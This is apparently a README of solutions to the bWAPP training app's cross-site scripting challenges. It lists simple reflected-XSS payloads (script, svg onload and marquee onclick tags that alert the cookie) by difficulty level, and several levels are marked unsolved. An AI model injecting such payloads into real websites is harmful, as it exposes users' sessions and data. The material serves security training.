# XSS-BWAPP-SOLUTION
Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scripting (XSS) challenges, meticulously curated and solved by BugBot19 (Nihar Rathod). This repository serves as a one-stop resource for anyone looking to understand and solve XSS vulnerabilities in the bWAPP (Buggy Web Application) framework.

A3-Cross-Site-Scripting

XSS - Reflected (GET)(LOW)
Payload- <script>alert(document.cookie)</script>(can be inserted in both parameter Firstname and lastname)
XSS - Reflected (GET)(MEDIUM)
Payload- <svg onload=alert(document.cookie)>(Can be inserted in both the parameter Firstname and Lastname)
XSS - Reflected (GET)(High)
NYF
XSS - Reflected (POST)(Low)
Payload-<script>alert(document.cookie)</script>
XSS - Reflected (POST)(Medium)
Payload-<svg onload=alert(document.cookie)>
XSS - Reflected (POST)(High)
NYF
XSS - Reflected (JSON)(Low)
Payload - <marquee onclick=alert(document.cookie)>Click on me</marquee>
XSS - Reflected (JSON)(Medium)
Payload – NYF
XSS - Reflected (JSON)(High)
Payload – NYF
XSS - Reflected (AJAX/JSON)(Low/Medium)
Payload - <marquee onclick=alert(1)>Click!!!</marquee>
XSS - Reflected (AJAX/JSON)(High)
